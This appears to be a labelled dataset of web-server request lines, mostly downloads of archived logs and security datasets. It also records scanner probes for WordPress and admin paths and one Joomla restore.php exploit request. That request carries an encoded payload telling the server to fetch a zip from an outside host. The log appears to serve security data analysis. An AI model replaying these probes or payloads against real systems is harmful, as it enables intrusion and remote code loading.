47,1,200,0,GET /self.logs/error.log.2016-04-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-06.gz HTTP/1.1
51,1,404,1,GET /honeypot/Honeypot%2520-%2520Howto.pdf HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-20.gz HTTP/1.1
59,1,404,1,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.0
59,1,404,1,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-21.gz HTTP/1.1
29,1,404,0,GET //popup-pomo.php HTTP/1.0
33,1,200,0,GET /tg/tg_snort_full.7z HTTP/1.1
33,1,200,0,GET /tg/tg_snort_full.7z HTTP/1.0
38,1,404,0,GET /access.log.2015-02-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-27.gz HTTP/1.1
55,1,200,0,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-13.gz HTTP/1.1
38,1,200,0,GET /maccdc2012/tunnel.log.gz HTTP/1.1
22,1,404,0,GET /atom.xml HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-10.gz HTTP/1.1
22,1,200,0,GET /tg/c.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-12.gz HTTP/1.1
31,1,301,0,GET /self.logs?C=M;O=A HTTP/1.1
38,1,404,0,GET /access.log.2015-02-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-16.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/smtp.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-25.gz HTTP/1.1
34,1,200,0,GET /scada/scada_logs.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-03.gz HTTP/1.1
23,1,404,0,GET /blog/feed HTTP/1.1
38,1,404,0,GET /access.log.2015-02-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-31.gz HTTP/1.1
37,1,200,0,GET /Security-Data-Analysis/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-28.gz HTTP/1.1
34,1,404,0,GET /apple-touch-icon.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-12.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-03-18.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-03-09.gz HTTP/1.1
25,1,404,0,GET /maccdc2012$ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-07.gz HTTP/1.1
28,1,404,0,GET /xmlrpc.php?rsd HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-09.gz HTTP/1.1
23,1,404,0,GET /index.xml HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-04.gz HTTP/1.1
54,1,404,0,GET /bootstrap/img/apple-touch-icon-72x72.png HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-22.gz HTTP/1.1
29,1,404,0,GET /maccdc2012/wget HTTP/1.1
54,1,404,0,GET /dede/templets/article_coonepage_rule.htm HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-11.gz HTTP/1.1
343,2,404,0,GET /self.logs/administrator/components/com_joomlaupdate/restore.php?task=stepRestore&factory=Tzo5OiJBS0ZhY3RvcnkiOjE6e3M6MTg6IgBBS0ZhY3RvcnkAdmFybGlzdCI7YToyOntzOjI3OiJraWNrc3RhcnQuc2VjdXJpdHkucGFzc3dvcmQiO3M6MDoiIjtzOjI2OiJraWNrc3RhcnQuc2V0dXAuc291cmNlZmlsZSI7czo0NDoiaHR0cDovL2VjZWxsLm5pdHJrbC5hYy5pbi9pcGl6cG0vd3Q1Mjg5bi56aXAiO319 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-13.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=M;O=A HTTP/1.1
32,1,200,0,GET /self.logs/?C=M;O=A HTTP/1.0
47,1,301,0,GET /self.logs/error.log.2015-12-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-06.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-11-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-03.gz HTTP/1.1
58,1,404,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0
58,1,404,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-31.gz HTTP/1.1
53,1,404,1,GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-18.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-03-21.gz HTTP/1.1
24,1,200,0,GET /#3p_threat HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-03.gz HTTP/1.1
45,1,418,1,GET /honeypot/BSidesDFW - 2014.ipynb HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-23.gz HTTP/1.1
20,1,200,0,GET /#about HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-02.gz HTTP/1.1
42,1,404,0,GET /wp/wp-admin/setup-config.php HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-09.gz HTTP/1.1
22,1,200,0,GET /#3p_file HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-22.gz HTTP/1.1
22,1,200,0,GET /#network HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-20.gz HTTP/1.1
26,1,404,0,GET /wp-login.php HTTP/1.0
26,1,404,0,GET /wp-login.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-17.gz HTTP/1.1
22,1,301,0,GET /manager/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-25.gz HTTP/1.1
36,1,404,0,GET /member/images/base.css HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-20.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-03-23.gz HTTP/1.1
28,1,301,0,GET /administrator/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-23.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-10.gz HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.1
24,1,200,0,GET /self.logs/ HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-01-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-05.gz HTTP/1.1
43,1,200,0,GET /Security-Data-Analysis/Lab_1/ HTTP/1.1
42,1,404,0,GET /apple-touch-icon-120x120.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-24.gz HTTP/1.1
223,1,200,0,GET /?nsukey=N9rkTszqr2F1tL9xXJtucbm02FuT9udcM79cxMqBXX9NEp46Xr0fokcc96z24thuLvOT2BBB2B2BOlYRUZ4A1qYP79NpCb6ivw1kJrc2Fmfg4aXRsGrTRxAM3FaQ2FJ92PLSup4uQ6tMUvHOyZXChd5iBdLpzzFV0Y2BJrWUsjWPYc2BrS6BnqD3KLr6rJQGrB0KX2Pjw HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-12.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-18.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-04.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-04-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-22.gz HTTP/1.1
40,1,404,0,GET /member/images/dzh_logo.gif HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-24.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-04-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-11.gz HTTP/1.1
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1
69,1,200,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-04-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-19.gz HTTP/1.1
23,1,200,0,HEAD /tg/c.zip HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-12-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-24.gz HTTP/1.1
40,1,200,0,GET //bootstrap/img/favicon.ico HTTP/1.1
35,1,404,0,GET /touch-icon-iphone.png HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-28.gz HTTP/1.1
32,1,404,0,GET /data/admin/ver.txt HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-26.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-03-27.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-10-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-01.gz HTTP/1.1
34,1,200,0,GET /scada/scada_logs.zip HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-03-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-27.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.1
37,1,200,0,GET /maccdc2012/files.log.gz HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-09-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-25.gz HTTP/1.1
35,1,200,0,HEAD /scada/scada_logs.zip HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2016-11-18.gz HTTP/1.1
49,1,404,1,GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-01.gz HTTP/1.1
31,1,301,0,GET /self.logs?C=D;O=A HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-15.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-29.gz HTTP/1.1
28,1,301,0,GET /test/wp-admin/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-06.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.1
36,1,200,0,GET /maccdc2012/http.log.gz HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-07-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-18.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-23.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-12-30.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-16.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2017-01-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-26.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-31.gz HTTP/1.1
221,1,200,0,GET /?nsukey=T4VlJC1T112zATF0Ida2Baoa3ZY9JkbzuURpniJ2BYKOZV3lpl1MOJHzQ1XRpB27jgv2yynHJ4bu4pUQZ2FGzjFGRIRdIzodJ9noNodZaV8v52BuxPG7ZKfmlTaZctarrfiIrn8JM2BuoYSt3ZlWTz8KtPYJ6sHARvhVsRlKE86sT3Bim2FagLnT2FOQd5KypzG8xNv HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-25.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2017-01-18.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2017-01-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-28.gz HTTP/1.1
18,1,404,0,GET /data HTTP/1.1
18,1,404,0,GET /data HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2016-04-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2017-01-04.gz HTTP/1.1
37,1,200,0,HEAD /maccdc2012/conn.log.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-05.gz HTTP/1.1
32,1,404,1,GET /honeypot/BSidesDFW HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2015-09-27.gz HTTP/1.1
